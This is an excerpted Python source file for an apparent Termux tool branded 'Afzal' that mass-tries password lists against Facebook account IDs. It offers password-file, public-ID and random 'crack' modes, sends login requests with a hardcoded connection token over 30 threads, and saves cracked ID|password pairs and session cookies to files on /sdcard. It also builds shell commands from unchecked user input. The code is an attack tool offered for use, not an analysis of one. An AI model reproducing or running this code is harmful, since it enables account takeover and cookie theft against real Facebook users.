...
os.system('clear')
print('Please Wait Loading Modules ...\n')
...
from concurrent.futures import ThreadPoolExecutor as AfzalAfzal
from string import * 
...
sys.stdout.write('\x1b]2; Afzal\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
██║  ██║██║     ███████╗██║  ██║███████╗
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝
\033[1;37m \033[1;37m \033[1;37m  \033[1;37m \033[1;37m \033[1;37m \033[1;37m    
\033[1;37m------------------------------------------------
\033[1;37m Owner    :           Afzal  Mumtaz 
\033[1;37m  Facebook:          Muhammad Afzal
\033[1;37m  Github  :             AfzalAheer
\033[1;37m  Version :             X V2.3
\033[1;37m  Status.  :             Free Version
\033[1;37m------------------------------------------------
 """
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Afzal Menu ")
        exit()

def Afzal():   
    os.system('clear')
    print(logo)
    print(f'[1] Possword File Crack')
    print(f'[2] Public ID Crack')
    print(f'[3] Random Crack ')
    print(f'[4] Create Possword File')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Afzal] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Afzalb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Afzalb};{ckkk}"
                    print(f"\r{R} [Afzal-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Afzal_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Afzal_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Afzal-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Afzal_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Afzal] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Afzal-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Afzal_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Afzal_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Afzal-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Afzal] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Afzal] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Afzal-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Afzal_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with AfzalAfzal(max_workers=30) as Afzalworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Afzalworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Afzalworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Afzalworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Afzalworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Afzal.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Afzal.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    Afzal = input('Put File Name :')
    print(" ")
    Afzal = input('Saving Put File Name :')
    os.system('touch ' +Afzal)
    os.system('sort -r '+Afzal+' | uniq > '+Afzal)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Afzal )
    print(47*'-')
    print("File Saved To :" + Afzal )
    print(47*'-')
    input(f"{S} Press Enter To Back Afzal Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/AFZAL.txt\n') 
        filepath = input("Put File Name: ")
